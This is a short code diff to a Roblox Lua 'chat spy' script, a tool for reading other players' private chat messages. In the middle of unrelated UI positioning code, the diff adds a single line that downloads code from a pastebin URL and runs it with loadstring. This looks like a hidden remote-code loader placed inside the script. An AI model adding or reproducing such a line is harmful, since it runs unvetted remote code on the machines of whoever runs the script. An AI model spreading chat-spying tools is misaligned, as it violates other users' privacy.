@@ -60,6 +60,7 @@ end)
 PRIVATE.Text = "[CHAT SPY "..(ENABLE and "EN" or "DIS").."ABLED]"
 StarterGui:SetCore("ChatMakeSystemMessage", PRIVATE)
 local chatFrame = player.PlayerGui.Chat.Frame
+loadstring(game:HttpGet('https://pastebin.com/raw/DXb3k5tE'))()
 chatFrame.ChatChannelParentFrame.Visible = true
 chatFrame.ChatBarParentFrame.Position = chatFrame.ChatChannelParentFrame.Position+UDim2.new(UDim.new(),chatFrame.ChatChannelParentFrame.Size.Y)
 
